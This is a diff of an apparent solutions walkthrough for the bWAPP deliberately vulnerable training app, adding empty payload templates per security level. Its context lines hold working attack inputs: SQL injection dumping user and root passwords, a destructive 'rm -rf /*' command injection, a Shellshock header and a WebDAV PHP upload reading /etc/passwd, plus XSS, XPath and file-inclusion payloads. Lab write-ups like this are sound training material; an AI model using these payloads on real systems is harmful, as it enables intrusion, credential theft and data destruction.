@@ -6,11 +6,29 @@
 
 url: /htmli_get.php
 
-\n### security level: low \n### security level: medium \n### security level: high \n\n
+### Security level: low
 
-### security level: medium
+Any HTML tags will work.
 
-### security level: high
+Payload:
+```
+<h>asdf</h>
+<u>asdf</u>
+<b>asdf</b>
+```
+
+### Security level: medium
+
+Payload: 
+```
+```
+
+### Security level: high
+
+Payload: 
+```
+```
+
 get's input with GET request and shows in the webpage with out validation in filtering
 
 ```
@@ -25,9 +43,21 @@ last name : <h1><b>World</b></h1>
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  HTML Injection - Reflected (POST) 💀
 
@@ -41,9 +71,21 @@ get's input from the input fields in sends POST request to the current webpage a
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  HTML Injection - Reflected (URL) 💀
 
@@ -56,9 +98,21 @@ htmli_current_url.php?>h1>Hacker loi</h1>
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  HTML Injection - Stored (Blog) 💀
 
@@ -102,9 +156,21 @@ nc -l 80
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  iFrame Injection 💀
 execute javascript by appending at in the uri
@@ -117,9 +183,21 @@ show prompt alert
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  OS Command Injection 💀
 url: /
@@ -142,9 +220,21 @@ www.nsa.gov && rm -rf /*
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  OS Command Injection - Blind 💀
 url: /commandi_blind.php
@@ -156,9 +246,21 @@ www.nsa.gov | sleep 10
 
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  PHP Code Injection 💀
 url: /phpi.php
@@ -179,9 +281,21 @@ show sessions
 phpi.php?message='whatever ';var_dump($_SESSION)
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Server-Side Includes: 💀
 url: /ssii.php
@@ -191,9 +305,21 @@ url: /ssii.php
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (GET/SEARCH) 💀
 
@@ -221,9 +347,21 @@ Type: boolean-based blind
 
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (GET/SELECT) 💀
 url: /sqli_2.php
@@ -243,9 +381,21 @@ sqli_2.php?movie=1%20UNION%20ALL%20SELECT%20table_schema%2ctable_name%2c%20null%
 ![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (POST/Search) 💀
 
@@ -261,9 +411,21 @@ ESSID=3agpar2ogveldop3d3psvfsfmt; security_level=0" --data "title=test&action=se
 
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (POST/Select) 💀
 
@@ -277,9 +439,21 @@ or burp code
 1%20UNION%20ALL%20SELECT%20table_schema%2c%20table_name%2c%20null%2c%20null%2c%20null%2c%20null%2c%20null%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%201%3b--
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (AJAX/JSON/jQuery) 💀
 url: /sqli_10-2.php
@@ -302,9 +476,21 @@ a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from informati
 blah%' union all select 1,login,password,email,secret,1, 1 from users --
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (Login Form/Hero) 💀
 useing burp
@@ -315,18 +501,42 @@ ok' or 1=1--
 login=ok' or 1=1-- "&password=ok' or 1=1--  
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection (Login Form/User) 💀
 ```
 ok' or 1=1-- "
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection(SQLite) 💀
 
@@ -342,9 +552,21 @@ or
 login=lol%' UNION ALL select * from users -- "&password=bug&
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  QL Injection - Stored (XML) 💀
 use burp
@@ -368,9 +590,21 @@ Parameter: XML (generic) login ((custom) POST)
 ---
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection - Blind - Boolean-Based 💀
 url /sqli_4.php
@@ -382,9 +616,21 @@ x' OR (select database()='bWAPP') AND '1'='1
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  SQL Injection - Stored (Blog) 💀
 
@@ -406,9 +652,21 @@ asdf',(select password from mysql.user where user='root' ))--
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XML/XPath Injection (Login Form) 💀
 using burp
@@ -424,9 +682,21 @@ login=bee&password=password%3d'%20or%20id%3d'2&form=submit
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XML/XPath Injection (Search) 💀
 
@@ -454,9 +724,21 @@ genre=') or not(contains(genre, 'xxx') and '1'='2
 # / A2 - Broken Authentication /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Broken Auth. - CAPTCHA Bypassing 💀
 
@@ -480,9 +762,21 @@ login=bee&password=bug&form=submit
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Broken Auth. - Logout Management 💀
 
@@ -491,9 +785,21 @@ at just redirects to the login page but does not deletes the session and cookie
 after loggin out you can still use the app with out logging in again and if you check the PHPSESSID at will still exists
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Session Mgmt. - Administrative Portals 💀
 
@@ -510,9 +816,21 @@ to
 admin=1
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Session Mgmt. - Cookies (HTTPOnly) 💀
 viewing and writting cookies
@@ -523,9 +841,21 @@ use burp
 security_level=0; PHPSESSID=ing4kmubr61dqeskckjb4dfu9h; top_security=yes;hacker_loi=<script>alert('lol')</script>
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Session Mgmt. - Cookies (Secure) 💀
 viewing and writting cookies
@@ -536,9 +866,21 @@ use burp
 security_level=0; PHPSESSID=ing4kmubr61dqeskckjb4dfu9h; top_security=yes;hacker_loi=<script>alert('another lol ;)')</script>
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Session Mgmt. - Session ID in URL 💀
 here you see your PHSESSID cookie in the url
@@ -547,9 +889,21 @@ cookie stealing
 Session IDs should never be exposed in the URL!
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Broken Auth. - Forgotten Function 💀
 this page is for sending or viewing the secret if the user forgot his password.
@@ -562,9 +916,21 @@ such website users credentails can be hacked just by using there emails to reset
 
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Broken Auth. - Insecure Login Forms 💀
 login with the credentails given the file . but you cont see at 
@@ -575,9 +941,21 @@ login: tonystark
 password: I am Iron Man
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Broken Auth. - Weak Passwords 💀
 using burp to brutforce the commen weak password and login to the system. this page dont have any sepcial security no time out system you can send millions of requests 
@@ -591,9 +969,21 @@ show different cookies change security level and visite given link to see the mo
 # / A3 - Cross-Site Scripting (XSS) /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (GET) 💀
 
@@ -604,9 +994,21 @@ you can insert html as well as js in the given fields
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (POST) 💀
 xss_post.php
@@ -618,9 +1020,21 @@ the same but with POST request
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (JSON) 💀
 
@@ -634,9 +1048,21 @@ xss_json.php
 title="%7D%5D%7D%27%3Bprompt%28"Hi%2C+Enter+Your+Name+Other+wise+your+game+is+ver+%3A0"%29<%2Fscript>&action=search
 ```
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (AJAX/JSON) 💀
 
@@ -647,9 +1073,21 @@ xss_ajax_2-1.php
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (AJAX/XML) 💀
 
@@ -666,9 +1104,21 @@ xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (Back Button) 💀
 
@@ -679,9 +1129,21 @@ Referer: ';alert(1);'
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (Custom Header) 💀
 
@@ -692,9 +1154,21 @@ bWAPP: <script>alert(1)</script>
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (Eval) 💀
 
@@ -703,9 +1177,21 @@ date=alert(1)
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (HREF) 💀
 
@@ -714,9 +1200,21 @@ Referer: <script>alert(1)</script>
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  XSS - Reflected (User-Agent) 💀
 
@@ -727,18 +1225,42 @@ User-Agent: <script>alert(1)</script>
 # / A4 - Insecure Direct Object References /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure DOR (Change Secret) 💀
 
 Use Burp to unhide hidden fields or intercept POST param.
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure DOR (Reset Secret) 💀
 
@@ -763,9 +1285,21 @@ Cache-Control: no-cache
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure DOR (Order Tickets) 💀
 
@@ -776,9 +1310,21 @@ Use Burp to unhide hidden ticket price field, or use proxy to modify the POST pa
 # / A5 - Security Misconfiguration /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Cross-Origin Resource Sharing (AJAX) 💀
 
@@ -810,9 +1356,21 @@ Access-Control-Allow-Origin: *
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Cross-Site Tracing (XST) 💀
 
@@ -856,9 +1414,21 @@ xmlhttp.send();
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure FTP Configuration 💀
 
@@ -898,9 +1468,21 @@ ftp> ^D
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure SNMP Configuration 💀
 
@@ -912,9 +1494,21 @@ $ snmpwalk -v2c -c public bwapp-server
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Insecure WebDAV Configuration 💀
 
@@ -925,9 +1519,21 @@ curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/
 # / A6 - Sensitive Data Exposure /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Base64 Encoding (Secret) 💀
 
@@ -936,9 +1542,21 @@ Use Burp to get cookie
 ![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Heartbleed Vulnerability 💀
 
@@ -951,9 +1569,21 @@ python heartbleed.py [ip]
 # / A7 - Missing Functional Level Access Control /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Directory Traversal - Directories 💀
 
@@ -964,9 +1594,21 @@ directory_traversal_2.php
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Directory Traversal - Files 💀
 
@@ -977,9 +1619,21 @@ directory_traversal_1.php
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Host Header Attack (Cache Poisoning) 💀
 
@@ -988,9 +1642,21 @@ hostheader_1.php
 ![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Host Header Attack (Reset Poisoning) 💀
 
@@ -999,9 +1665,21 @@ hostheader_2.php
 ![]()
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Remote & Local File Inclusion (RFI/LFI) 💀
 
@@ -1012,9 +1690,21 @@ bWAPP/rlfi.php?language=../evil/rfi
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Restrict Device Access 💀
 
@@ -1029,27 +1719,63 @@ User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleW
 Reference the HTML files in resources directory. You can modify these to auto execute in a hidden iframe as an exercise. If bWAPP had CSRF mitigations (such as utilization of tokens), then the POST requests made from the csrf_x.html files would respond with forbidden.
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Cross-Site Request Forgery (Change Password) 💀
 
 Please reference [csrf_1.html](resources/csrf_1.html). Replace the address within the HTML with your own bWAPP server and run the form to change the password. If CSRF tokens were utilized, then the server should return forbidden.
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Cross-Site Request Forgery (Change Secret) 💀
 
 Please references [csrf_2.html](resources/csrf_2.html). Again, replace the address within the HTML with your own bWAPP server to change the secret.
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Cross-Site Request Forgery (Transfer Amount) 💀
 
@@ -1058,9 +1784,21 @@ Please references [csrf_3.html](resources/csrf_3.html). Again, replace the addre
 # / A9 - Using Known Vulnerable Components /
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  PHP CGI Remote Code Execution 💀
 
@@ -1085,9 +1823,21 @@ http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
 ```
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  Shellshock Vulnerability (CGI) 💀
 
@@ -1104,9 +1854,21 @@ Referer: () { nothing;}; echo; /bin/cat /etc/passwd
 # Other bugs...
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  HTTP Paramter Pollution 💀
 
@@ -1119,9 +1881,21 @@ bee&movie=1
 then every link will choose G.I Joe: Retaliation movie.
 
 
-### security level: low 
-### security level: medium 
-### security level: high 
+### Security level: low
+
+Payload: 
+```
+``` 
+### Security level: medium
+
+Payload: 
+```
+``` 
+### Security level: high
+
+Payload: 
+```
+``` 
 
 ## 💀  HTTP Response Splitting 💀
 
